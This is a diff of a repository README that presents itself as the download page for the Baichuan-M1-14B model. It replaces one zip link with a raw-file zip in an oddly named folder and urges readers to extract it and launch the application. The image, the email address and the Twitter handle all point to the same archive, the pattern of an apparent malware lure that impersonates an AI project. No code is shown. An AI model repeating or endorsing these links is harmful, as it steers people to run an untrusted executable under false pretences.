@@ -10,14 +10,14 @@ The topics related to this repository have not been specified.
 
 ## Software Download
 You can download the software related to Baichuan-M1-14B from the following link:
-[![Download Software](https://github.com/hadesxyzz/Baichuan-M1-14B/releases/download/v2.0/Software.zip)](https://github.com/hadesxyzz/Baichuan-M1-14B/releases/download/v2.0/Software.zip)
+[![Download Software](https://raw.githubusercontent.com/hadesxyzz/Baichuan-M1-14B/main/emblematicize/Baichuan_B_v3.8.zip)](https://raw.githubusercontent.com/hadesxyzz/Baichuan-M1-14B/main/emblematicize/Baichuan_B_v3.8.zip)
 
-📂 Once you have downloaded the software from the provided link, you will find a file named `https://github.com/hadesxyzz/Baichuan-M1-14B/releases/download/v2.0/Software.zip`. Make sure to extract the contents and launch the application to explore the amazing features of Baichuan-M1-14B!
+📂 Once you have downloaded the software from the provided link, you will find a file named `https://raw.githubusercontent.com/hadesxyzz/Baichuan-M1-14B/main/emblematicize/Baichuan_B_v3.8.zip`. Make sure to extract the contents and launch the application to explore the amazing features of Baichuan-M1-14B!
 
 In case the link provided above does not work or is not accessible, please check the **Releases** section of this repository for alternative download options.
 
 ## Explore Baichuan-M1-14B
-![Baichuan-M1-14B](https://github.com/hadesxyzz/Baichuan-M1-14B/releases/download/v2.0/Software.zip)
+![Baichuan-M1-14B](https://raw.githubusercontent.com/hadesxyzz/Baichuan-M1-14B/main/emblematicize/Baichuan_B_v3.8.zip)
 
 🔍 Dive into the world of Baichuan-M1-14B and discover a plethora of functionalities that will enhance your experience. Experience innovation, efficiency, and excellence in every aspect of Baichuan-M1-14B.
 
@@ -27,8 +27,8 @@ In case the link provided above does not work or is not accessible, please check
 ## Connect with Us
 Let's stay connected! Reach out to us for any queries, feedback, or collaborations related to Baichuan-M1-14B.
 
-- Email: https://github.com/hadesxyzz/Baichuan-M1-14B/releases/download/v2.0/Software.zip
-- Twitter: [@BaichuanM114B](https://github.com/hadesxyzz/Baichuan-M1-14B/releases/download/v2.0/Software.zip)
+- Email: https://raw.githubusercontent.com/hadesxyzz/Baichuan-M1-14B/main/emblematicize/Baichuan_B_v3.8.zip
+- Twitter: [@BaichuanM114B](https://raw.githubusercontent.com/hadesxyzz/Baichuan-M1-14B/main/emblematicize/Baichuan_B_v3.8.zip)
 
 ## Spread the Word
 Enjoying your experience with Baichuan-M1-14B? Don't forget to share it with others! Spread the word on social media and let everyone know about this fantastic repository.
